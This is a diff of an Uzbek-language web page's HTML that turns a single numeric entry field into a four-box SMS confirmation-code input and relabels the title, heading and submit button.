@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Milliy 24</title>
+    <title>Milliy SMS</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link
@@ -12,7 +12,7 @@
     />
     <link rel="stylesheet" href="./styles.css" />
   </head>
-  <body data-screen="flow" data-step="age">
+  <body data-screen="flow" data-step="sms">
     <div class="page-shell"></div>
 
     <main class="page">
@@ -24,23 +24,19 @@
         </div>
 
         <header class="hero-copy step-copy">
-          <h1>SMS kodni kiriting</h1>
+          <h1>Tasdiqlash kodini kiriting</h1>
           </header>
 
         <form class="step-form" id="stepForm">
-          <div class="phone-field single-field">
-            <input
-              id="stepValue"
-              name="value"
-              type="text"
-              inputmode="numeric"
-              required
-            />
+          <div class="otp-grid" id="otpGrid">
+            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" />
+            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" />
+            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" />
+            <input class="otp-input" type="text" inputmode="numeric" maxlength="1" />
           </div>
-          <p class="field-error" id="fieldError"></p>
 
-          <button class="submit-btn secondary-btn is-inactive" type="submit" id="submitStepButton" disabled>
-            Yuborish
+          <button class="submit-btn secondary-btn" type="submit" id="submitStepButton">
+            Davom etish
           </button>
           <p class="status" id="statusMessage" aria-live="polite"></p>
         </form>
